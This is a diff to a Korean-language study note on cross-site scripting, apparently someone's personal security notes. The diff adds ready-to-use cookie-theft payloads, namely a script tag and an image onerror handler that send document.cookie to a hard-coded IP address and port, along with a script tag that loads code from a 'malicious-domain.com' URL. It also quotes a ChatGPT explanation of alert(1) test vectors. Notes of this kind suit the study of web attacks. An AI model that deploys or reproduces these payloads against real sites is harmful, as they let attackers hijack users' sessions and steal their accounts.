@@ -24,7 +24,11 @@ Universal XSS
 쿠키 및 세션 탈취 코드
 
 ```javascript
-<script>
+<script> new Image().src = 'http://211.250.216.249:7444/?cookie=' + document.cookie;</script>
+<img src="nonexistent.jpg" onerror="new Image().src = 'http://211.250.216.249:7444/?cookie=' + document.cookie;">
+
+
+<script src="http://malicious-domain.com/evil_script.js">
 // "hello" 문자열 alert 실행
 alert("hello");
 // 현재 페이지의 쿠키(return type: string)
@@ -88,8 +92,8 @@ document[location].href 이런식으로 더 노련하게 우회할 수 있음
 
 
 # 주의할 점
-<script src="/vuln?param=alert(1)"></script>와 
-<script>location.href="/vuln?param=alert(1)"</script>는 동작이 다름
+``<script src="/vuln?param=alert(1)"></script>`와 
+``<script>location.href="/vuln?param=alert(1)"</script>`는 동작이 다름
 
 ```chatgpt
 <script src="/vuln?param=alert(1)"></script>: 이 코드는 /vuln?param=alert(1) URL에서 스크립트 파일을 로드하려고 시도합니다. 만약 웹 서버가 이 URL에 대한 스크립트 파일을 반환하면 브라우저는 해당 스크립트를 실행하고 alert(1)을 실행할 것입니다. 이는 XSS (Cross-Site Scripting) 공격의 일반적인 형태입니다.
